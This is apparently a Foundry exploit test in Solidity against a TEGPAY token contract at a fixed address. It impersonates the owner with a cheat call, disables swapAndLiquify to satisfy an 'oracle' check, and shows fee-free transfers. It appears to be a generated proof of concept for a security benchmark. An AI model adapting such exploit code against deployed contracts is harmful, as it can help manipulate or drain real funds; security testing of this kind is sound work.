pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface TEGPAY {
    function swapAndLiquifyEnabled() external view returns (bool);
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function isExcludedFromFee(address account) external view returns (bool);
    function excludeFromFee(address account) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xc35B753d5F2e86cae7C42f755eb1812855aB10c0;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Impersonate the owner
        address owner = 0xBd51b6D98574327734C1621A7283778c5e6Af86e;
        vm.startPrank(owner);

        // Get the TEGPAY contract interface
        TEGPAY targetContract = TEGPAY(TARGET);

        // First, disable swapAndLiquify to satisfy the oracle
        bool initialSwapState = targetContract.swapAndLiquifyEnabled();
        targetContract.setSwapAndLiquifyEnabled(false);

        // Verify the state changed
        bool newSwapState = targetContract.swapAndLiquifyEnabled();
        require(newSwapState == false, "swapAndLiquifyEnabled should be false");

        // Demonstrate additional owner privilege abuse: exclude owner from fees
        // (Owner is already excluded from fee in constructor, but we'll verify)
        bool isExcluded = targetContract.isExcludedFromFee(owner);
        if (!isExcluded) {
            targetContract.excludeFromFee(owner);
        }

        // Get owner's balance
        uint256 ownerBalance = targetContract.balanceOf(owner);

        // Transfer some tokens to demonstrate fee evasion
        // We'll transfer to a random address to show no fees are taken
        address recipient = address(0x123);
        uint256 transferAmount = 1000 * 10**18; // 1000 tokens

        // Check if owner has enough balance
        if (ownerBalance > transferAmount) {
            // Perform transfer - should have no fees since owner is excluded from fee
            uint256 recipientBalanceBefore = targetContract.balanceOf(recipient);
            targetContract.transfer(recipient, transferAmount);
            uint256 recipientBalanceAfter = targetContract.balanceOf(recipient);

            // Verify full amount was received (no fees deducted)
            require(recipientBalanceAfter - recipientBalanceBefore == transferAmount, "Fee evasion failed: fees were deducted");
        }

        vm.stopPrank();

        // Final oracle check: swapAndLiquifyEnabled must be false
        assertEq(newSwapState, false, "swapAndLiquifyEnabled should be false after owner abuse");
        assertEq(targetContract.swapAndLiquifyEnabled(), false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

